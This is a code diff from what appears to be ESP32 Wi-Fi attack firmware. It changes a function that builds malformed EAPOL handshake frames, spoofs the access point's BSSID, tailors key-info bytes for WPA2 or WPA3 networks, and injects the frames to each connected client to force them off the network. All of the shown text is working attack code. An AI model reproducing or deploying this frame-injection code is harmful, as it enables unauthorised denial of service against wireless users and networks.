@@ -433,7 +433,7 @@ void wifi_attack_deauth_client_bad_msg1(void)
     static uint64_t replay_counter = 2000;
     uint8_t eapol_packet_bad_msg1[153] = {
         0x08, 0x02,                         // Frame Control (EAPOL)
-        0x00, 0x00,                         // Duration
+        0x3A, 0x01,                         // Duration
         0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
@@ -477,6 +477,7 @@ void wifi_attack_deauth_client_bad_msg1(void)
     };
     memcpy(&eapol_packet_bad_msg1[10], target_local.bssid, 6);    // Source Address
     memcpy(&eapol_packet_bad_msg1[16], target_local.bssid, 6);    // BSSID
+
     /* Generate random Nonce */
     for (uint8_t i = 0; i < 32; i++) {
         eapol_packet_bad_msg1[49 + i] = esp_random() & 0xFF; // Inserisce il valore nel campo Key Nonce
@@ -486,11 +487,26 @@ void wifi_attack_deauth_client_bad_msg1(void)
         eapol_packet_bad_msg1[41 + i] = (replay_counter >> (56 - i * 8)) & 0xFF;
     }
 
+    /* Set WPA/WPA2 or WPA3 */
+    if(target_local.authmode == WIFI_AUTH_WPA2_PSK || target_local.authmode == WIFI_AUTH_WPA2_ENTERPRISE) 
+    {
+        eapol_packet_bad_msg1[38] = 0xCA;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
+        eapol_packet_bad_msg1[39] = 0x00;      // Key Length MSB
+        eapol_packet_bad_msg1[40] = 0x10;      // Key Length LSB   (must be 0 with GCMP)
+    }
+    else if(target_local.authmode == WIFI_AUTH_WPA3_PSK || target_local.authmode == WIFI_AUTH_WPA3_ENTERPRISE || target_local.authmode == WIFI_AUTH_WAPI_PSK || target_local.authmode == WIFI_AUTH_WPA2_WPA3_PSK) 
+    {
+        eapol_packet_bad_msg1[38] = 0xCB;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
+        eapol_packet_bad_msg1[39] = 0x00;      // Key Length MSB
+        eapol_packet_bad_msg1[40] = 0x00;      // Key Length LSB   (must be 0 with GCMP)
+    }
+
     /* Skip broadcast address */
     for (uint8_t i = 1; i < num_clients; i++) 
     {
         memcpy(&eapol_packet_bad_msg1[4], clients[i].mac, 6); // Destination Address (Client MAC)
         esp_wifi_80211_tx(WIFI_IF_STA, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
+        
         /* Increase replay counter for next packet */
         replay_counter++;
     }
